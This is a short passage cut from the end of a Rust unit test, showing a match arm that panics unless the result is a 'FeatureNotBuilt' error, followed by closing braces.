            Err(other) => panic!("expected FeatureNotBuilt, got {other}"),
        }
    }
}
